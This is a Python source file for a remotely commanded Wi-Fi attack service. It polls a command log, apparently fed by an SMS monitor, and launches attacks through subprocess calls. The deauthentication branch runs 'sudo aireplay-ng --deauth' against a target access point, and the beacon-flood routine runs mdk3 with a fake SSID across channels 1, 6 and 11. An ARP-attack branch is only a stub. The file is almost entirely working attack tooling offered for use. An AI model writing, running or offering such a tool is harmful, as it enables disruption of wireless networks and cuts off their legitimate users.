import subprocess
import time
import threading
from deauth import Deauther
from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
import json
from scapy.all import *
import os
from rich.console import Console
from rich.table import Table
from rich.live import Live
from rich.prompt import Prompt

console = Console()

COMMANDS_LOG_FILE = "commands.log"

subprocess.run(["bash", "monitor_mode.sh"])

def start_service(pending):
    """Starts the main attack service that processes the queue."""
    timestamp=''
    interface=''
    target=''
    amount = 10
    m = ''
    channel = ""
    size= amount
    for i in pending:
        console.print(pending)
        a= i.get('command')
        argu = i.get('args')
        
        if a == 'deauth':
            console.print('Deauth Attack Command Found !', style="bold red")
    
            target = argu.get('target')
            interface = argu.get('interface')
            amount = argu.get('packets')
            channel = argu.get('ch')

            if target and interface and amount:
                subprocess.run(["sudo", "iwconfig", interface, "channel", str(channel)], check=True)
                console.print(f"[red]Running Deauth attack on {target} using {interface}[/red]")
        
        # Construct the aireplay-ng command
                cmd = [
            "sudo", "aireplay-ng", "--deauth", str(amount), "-a", target, interface
        ]
        
                try:
                    subprocess.run(cmd, check=True)
                    console.print("[+] Deauth attack executed successfully.")
                except subprocess.CalledProcessError:
                    console.print("[!] Error executing deauth attack.")

            else:
                console.print("[!] Missing required arguments for deauth attack.")

            timestamp = i.get('timestamp')
            console.print(timestamp)
            update_command_status(timestamp)
            console.print('executed')
            break

        elif a == 'arp':
            console.print('Arp Attack Command Found', style="bold red")
            timestamp=i.get('timestamp')
            console.print(timestamp)
            update_command_status(timestamp)
            console.print('executed')
            break
        elif a == 'evil':
            console.print('Beacon Flood Attack Command found' , style="bold red")
            m=argu.get('target')
            size = argu.get("duration")
            beacon_flood("wlx001ea6ff9116",m,size)
            timestamp=i.get('timestamp')
            console.print(timestamp)
            update_command_status(timestamp)
            console.print('executed')

            break






def update_command_status(timestamp):
    if not os.path.exists(COMMANDS_LOG_FILE):
        return

    updated_lines = []

    
    with open(COMMANDS_LOG_FILE, "r") as log_file:
        lines = log_file.readlines()

    for line in lines:
        try:
            command_entry = json.loads(line.strip())

            
            if command_entry.get("timestamp") == timestamp and command_entry.get("status") == "pending":
                command_entry["status"] = "executed"

            updated_lines.append(json.dumps(command_entry)) 
        except json.JSONDecodeError:
            console.print("[!] Skipping malformed entry in commands.log")
            updated_lines.append(line.strip()) 

    
    with open(COMMANDS_LOG_FILE, "w") as log_file:
        log_file.write("\n".join(updated_lines) + "\n")







def beacon_flood(interface="wlan1", ssid="FakeSSID", duration=20):
    channels = [1, 6, 11]  # Common Wi-Fi channels
    console.print(f"[+] Starting beacon flood on {interface} with SSID: {ssid}")

    processes = []
    for ch in channels:
        cmd = ["sudo", "mdk3", interface, "b", "-c", str(ch), "-n", ssid]
        processes.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        time.sleep(5)  # Let each channel run for 5 seconds

    time.sleep(duration)  # Run for 'duration' seconds
    for process in processes:
        process.terminate()  # Stop all processes

    console.print("[+] Beacon flood stopped.")











def run_deauth(target, interface, amount=50):
    console.print(f"[red]Running Deauth attack on {target} using {interface}[/red]")
    deauther = Deauther(target, interface, amount)
    deauther.deauth_attack()


def start_sms_monitor():
    """Starts the SMS monitoring in the background."""
    subprocess.run(["bash", "unlock.sh"])
    subprocess.Popen(["python3", "utils/sms.py"])

def clrscr():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_pending_commands():
    
    pending_commands = []

    if not os.path.exists(COMMANDS_LOG_FILE):
        return []


    with open(COMMANDS_LOG_FILE, "r") as log_file:
        lines = log_file.readlines()

    for line in lines:
        try:
            command_entry = json.loads(line.strip())
            if command_entry.get("status") == "pending":
                pending_commands.append(command_entry)
        except json.JSONDecodeError:
            console.print("[!] Skipping malformed entry in commands.log")

    return pending_commands


def looper():
    chack=0
    while True:
        
        console.print("Fetching commands :-  ",chack , style = "#cee712")
        pending_commands = get_pending_commands()
        if pending_commands:
                
                start_service(pending_commands)
                console.print('Attack Executed', style="italic magenta")
        chack= chack +1
        time.sleep(10) 
        




def main():
    clrscr()
    pending = get_pending_commands()
    console.print('Commands  pending listing now \n',pending , style="bold red")
    console.print("[+] Starting attack service and SMS monitor...", style="bold green")
    console.print("[+] Started attack service ...", style="bold blue")
    console.print("[+] Started  SMS monitor...", style="bold blue")
    console.print("[+] Running in background. Use dashboard to send commands.")
    looper()
    while True:
        time.sleep(60)  # Keep main alive

if __name__ == "__main__":
    main()
